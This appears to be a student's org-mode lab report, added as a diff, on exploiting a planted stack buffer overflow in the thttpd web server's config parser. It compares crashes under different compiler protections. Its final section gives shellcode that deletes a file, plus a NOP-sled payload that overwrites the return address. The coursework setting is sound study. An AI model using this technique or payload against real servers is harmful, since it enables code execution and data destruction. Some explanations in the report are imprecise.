@@ -1,0 +1,335 @@
+#+TITLE: Smashing Lab
+#+AUTHOR: Nikola Samardzic
+#+OPTIONS: toc:nil
+* 3 Setup
+First I run the src/thttpd-sp version on port 12799.
+Second I run the src/thttpd-sp version on port 12800.
+Third I run the src/thttpd-sp version on port 12801.
+
+* 4 Setup, part 2
+Inside the thttpd directory I call
+curl http://localhost:12799/README (README is a valid filename in this 
+directory and the default working directory for thttpd is the directory in
+which the executable is located). This command spits out the contents of
+README into the terminal window in the style of 'cat'.
+* 5 SP Crash
+I need the debugger to be able to see how to implant the bug. From the patch
+we can see that the bug is introduced into the read_config function inside
+thttpd.c file. By examining the code of thttpd.c I noticed that the function
+read_config is called only when the -C tag is specified:
+
+#+begin_src C:
+        else if ( strcmp( argv[argn], "-C" ) == 0 && argn + 1 < argc )
+            {
+            ++argn;
+            read_config( argv[argn] );
+            }
+#+end_src
+
+We also note that the bug occurs when because the variable 'line' is fed 
+with more than 100 chars (the limit was erroneously set to 1000 in fgets).
+Therefore, we need a config file that contains a line with more than 100
+characters. So, I created a config.txt file that contains the char 'X'
+repeated 150 times.
+So, I run src/thttpd-sp inside gdb with options -p 12799 -D -C config.txt
+This didn't work, because the function read_config has a long if-else-if
+branch that checks the current line of the config file with all the valid
+words that thttpd expects in the file. Since XXXX... is not a valid word
+thttpd will return an error message specifying that the config file contains
+invalid entries.
+Therefore we must use valid entries. I noticed that the word 'debug' is 
+considered a valid config file word. I changed my config.txt to contain many
+copies of 'debug' seperated by white space.
+Running src/thttpd-sp with this new config file does produce sa SIGSEGV runtime
+error, because unallocated memory was accessed. This is what we wanted.
+
+The message outputed states:
+
+#begin_src
+ *** stack smashing detected ***: 
+ /w/home.13/cs/ugrad/nikola/sthttpd-2.27.0/src/thttpd-sp terminated
+#end_src
+
+Now we generate the backtrace using the bt command:
+
+#begin_src
+#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404cb3 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x7562656400677562 in ?? ()
+#8  0x0067756265640067 in ?? ()
+#9  0x6564006775626564 in ?? ()
+#10 0x7562656400677562 in ?? ()
+#11 0x0067756265640067 in ?? ()
+#12 0x6564006775626564 in ?? ()
+#13 0x7562656400677562 in ?? ()
+#14 0x00007fff00000067 in ?? ()
+#15 0x0000000000000000 in ?? ()
+#end_src
+
+We see the read_config function on the stack, as well as additional functions
+that are called due to the gcc tags we added and because a stack error occurs.
+We need to disassemble the line of read_config that caused this additional 
+mess by using disas 0x404cb3:
+
+#begin_src
+0x0000000000404cae <+1358>:callq  0x402180 <__stack_chk_fail@plt>
+0x0000000000404cb3 <+1363>:mov    %r13,%rsi
+#end_src
+
+we see a call to the stack_chk_fail function. By running the program using step
+i, we see that the call to stack_chk_fail is reached from the jump:
+
+#begin_src
+0x0000000000404c06 <+1190>:mov    0x68(%rsp),%rax
+0x0000000000404c0b <+1195>:xor    %fs:0x28,%rax
+0x0000000000404c14 <+1204>:jne    0x404cae <read_config+1358>
+#end_src
+
+I would assume that here the value of the stack at offset 68 is compared to the
+value of the saved cannery value. These two values are suppose to be equal. If
+they are not we know something wrote over forbidden stack locations and we jump
+to the stack_chk_fail function.
+* 6 AS Crash
+Running the AS version with the same parameters as in 5, we get a big
+message from the compiler indicating possible causes of the bad memory
+reference. The error message states 
+
+'line' <== Memory access at offset 132 overflows this variable
+which means the error message correctly pinpoints the issue.
+
+A part of the error message contains the backtrace:
+
+#begin_src
+    #0 0x43aec8 in __interceptor_strchr ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+    #1 0x4e0b50 in read_config /u/cs/ugrad/nikola/sthttpd-2.27.0/src/thttpd.c:1018
+    #2 0x4e164e in parse_args /u/cs/ugrad/nikola/sthttpd-2.27.0/src/thttpd.c:893
+    #3 0x408297 in main /u/cs/ugrad/nikola/sthttpd-2.27.0/src/thttpd.c:380
+    #4 0x7ffff6cc6b34 in __libc_start_main (/lib64/libc.so.6+0x21b34)
+    #5 0x4093f9  (/w/home.13/cs/ugrad/nikola/sthttpd-2.27.0/src/thttpd-as+0x4093f9)
+#end_src
+
+By disassemling the code around 0x4e0b4c we see that the last line of read_config was
+
+#begin_src
+0x00000000004e0b35 <+165>:call   0x405ee0 <fgets@plt>
+0x00000000004e0b3a <+170>:test   rax,rax
+0x00000000004e0b3d <+173>:je     0x4e10ed <read_config+1629>
+0x00000000004e0b43 <+179>:mov    rdi,QWORD PTR [rsp]
+0x00000000004e0b47 <+183>:mov    esi,0x23
+0x00000000004e0b4c <+188>:call   0x43b080 <__interceptor_strchr(char const*, int)>
+#end_src
+
+Note: The disassembled code above was generated days after the code above it
+so the stack addresses might not match.
+
+__interceptor_strchr is used to check the stack for overwritting illegal 
+values on the stack. It is called right before 
+
+1018: if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+
+that is, before the call to strchr(). It notices the problem, and throws an
+error before strchr is called.
+* 7 NO Crash
+The NO version crashes at return:
+0x404d9f <read_config+1215>     retq
+
+The backtrace produced by the crash is
+
+#begin_src
+#0  0x0000000000404d9f in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x7562656400677562 in ?? ()
+#2  0x0067756265640067 in ?? ()
+#3  0x6564006775626564 in ?? ()
+#4  0x7562656400677562 in ?? ()
+#5  0x0067756265640067 in ?? ()
+#6  0x6564006775626564 in ?? ()
+#7  0x7562656400677562 in ?? ()
+#8  0x0000000000000067 in ?? ()
+#9  0x0000000000403743 in main (argc=<optimized out>, argv=<optimized out>)
+    at thttpd.c:380
+#end_src
+
+This version of the executable has no stack protection and crashes on
+return without calling any other functions.
+* 8 Difference in assembly
+The variation with no stack protection calls no outside functions and just
+executes code linearly. The assembly code for strong-stack-protection (SP)
+is identical to the NO variant for this function. I assume this is because
+the SP variant creates a cannery. The cannery isn't taken care of in this
+function, so there is no way to spot the difference between having a cannery
+and not having a cannery if we only look at handle_read
+
+The variation with the address sanitzer (SP) is the most elaborate. 
+It checks to see if any "shadow memory" is present and calls an 
+__asan_report function, which 'aborts the program and sends error message' 
+(from manual). Here, SP calls functions to check to see what is loaded.
+Shadow memory can be used to check for invalid memory accesses, even if
+the program does not crash due to segmentation faults. Valgrind uses similar
+methods. So, the assembly coad is increased because of the many instruction
+calls that look at shadow memory to determine if memory is corrupted.
+
+* 9 Exploiting the bug
+Running the code with gdb-peda and the original config file from above we get the
+following output:
+
+#begin_src
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x67756265640067 ('g')
+RCX: 0x0 
+RDX: 0x7ffff7997fe0 --> 0x21000 
+RSI: 0x7ffff79977b8 --> 0x617000 --> 0x0 
+RDI: 0x20000 
+RBP: 0x6564006775626564 ('debug')
+RSP: 0x7fffffffcfa8 --> 0x7562656400677562 ('bug')
+RIP: 0x404d9f (<read_config+1215>:ret)
+R8 : 0x1 
+R9 : 0x7ffff7fcf740 (0x00007ffff7fcf740)
+R10: 0x7fffffffcc90 --> 0x0 
+R11: 0x206 
+R12: 0x7562656400677562 ('bug')
+R13: 0x67756265640067 ('g')
+R14: 0x6564006775626564 ('debug')
+R15: 0x5
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+0x404d99 <read_config+1209>:pop    r12
+0x404d9b <read_config+1211>:pop    r13
+0x404d9d <read_config+1213>:pop    r14
+=> 0x404d9f <read_config+1215>:ret    
+0x404da0 <read_config+1216>:mov    rsi,r13
+0x404da3 <read_config+1219>:mov    rdi,rbp
+0x404da6 <read_config+1222>:call   0x404630 <no_value_required>
+0x404dab <read_config+1227>:
+    mov    DWORD PTR [rip+0x2111f3],0x1        # 0x615fa8 <no_empty_referers>
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffcfa8 --> 0x7562656400677562 ('bug')
+0008| 0x7fffffffcfb0 --> 0x67756265640067 ('g')
+0016| 0x7fffffffcfb8 --> 0x6564006775626564 ('debug')
+0024| 0x7fffffffcfc0 --> 0x7562656400677562 ('bug')
+0032| 0x7fffffffcfc8 --> 0x67756265640067 ('g')
+0040| 0x7fffffffcfd0 --> 0x6564006775626564 ('debug')
+0048| 0x7fffffffcfd8 --> 0x7562656400677562 ('bug')
+0056| 0x7fffffffcfe0 --> 0x67 ('g')
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+1190    }
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-157.el7_3.1.x86_64 nss-softokn-freebl-3.16.2.3-14.4.el7.x86_64
+#end_src
+
+We see we overwrote contents of some of the registers and that the stack is
+affected but %rip remains intact. By the blog post linke on the lab page
+this is bacause we are attempting to load an address into %rip that is not
+a valid instruction pointer on linux.
+
+Unfortunately, we cannot just put anything into the config file because
+the config parser will notice if the config contains invalid keywords.
+Luckly, we can type in an arbitrary number of spaces. This will be coded
+into zeros if it were to write over the return address on the stack.
+
+If you type 'debug' once into the config and follow it with a lot of spaces
+the rip will be overwritten and become 0x0 which is again unfortunately a
+invalid address. What I did is I wrote two 'debug' and a number of spaces
+between them. Then using binary search i located where I should put the 
+second 'debug' so that the rip gets overwritten with a legal address value.
+I got to overwrite rip with the address 0x6775626564 (='debug') as 
+demonstrated by gdb:
+
+RIP: 0x6775626564 ('debug')
+
+Right now, the stack pointer, when entering read_config, is at 0x7fffffffcfa8.
+This value will contain the return address. We want to overwrite this. Also,
+the line char pointer starts at 0x7fffffffcf10. 
+So 0x7fffffffcfa8 - 0x7fffffffcf10 = 152
+Therefore, the 153rd character in config.txt will overwrite the return address.
+I change my config file to
+
+#xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdebug
+
+The '#' at the beginning will be regarded by read_config as a beginning of
+the comment line. This lets us circumvent read_config's word check system and
+insert whatever we want.
+
+Using gdb-peda we can see that RIP is changed to 'debug':
+
+RIP: 0xa6775626564 ('debug\n')
+
+OK, now we want to make RIP point to the beginning of a program that we yet
+have to insert into the config.txt.
+
+I created an unlink.s file:
+
+movq    $0x7fffffffcf38, %rdi
+movq    $0x57, %rax
+syscall
+
+code will delete a file named 'target.txt'. It uses Unix's syscall to remove a 
+file, the name of the file was transcribed to hex 
+($0x7fffffffcf38 = 'target.txt').
+
+Now we compile this with 
+
+gcc -c unlink.s
+
+Now examine the executable using objdump -d unlink.o:
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+0:48 bf 38 cf ff ff ff movabs $0x7fffffffcf38,%rdi
+7:7f 00 00 
+a:48 c7 c0 57 00 00 00 mov    $0x57,%rax
+11:0f 05                syscall
+
+So, the hex value of the code we use to delete target.txt is
+
+48 bf 38 cf ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+
+Now, I create a config file
+
+0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x\
+90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90\
+ 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0\
+x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x9\
+0 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 \
+0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x48 0xbf 0x38 0xcf 0xff 0xff 0xff 0x7f 0x00 0x00 0x48 0xc7 0xc0 0x57 0x00 0x\
+00 0x00 0x0f 0x05 0x09 0x09 0x09 0x09 0x91 0xcf 0xff 0xff 0xff 0x7f 0x00 0x00
+
+and run it through the following program with the command 
+./conv <config.txt >temp.txt:
+
+#begin_src
+#include <stdio.h>
+
+int main (void) {
+  int i;
+  while (scanf("%x", &i) != EOF)
+    printf("%c", i);
+
+  return 0;
+}
+#end_src
+
+to generate the appropriate exploit file.
+
+What this code does is tries to execute the exploit by positioning the 
+return address to 0x7fffffcf91 (0x91 0xcf 0xff 0xff 0xff 0x7f 0x00 0x00), 
+which is the beggining of the exploit code on the stack.
+
+After running the program we see that gdb does not report a SIGSEGV but a
+SIGILL. Also, we see that the value of the instruction pointer at the time
+of the crash is 0x00007fffffffcfa6. This implies that the program executed
+the lines of the exploit between 0x7fffffcf91 and 0x00007fffffffcfa6 and then
+crashed at 0x00007fffffffcfa6 because we overflowed the line array only
+until 0x00007fffffffcfa8. So I assume 0x00007fffffffcfa6 contains some
+junk values that the computer cannot execute.
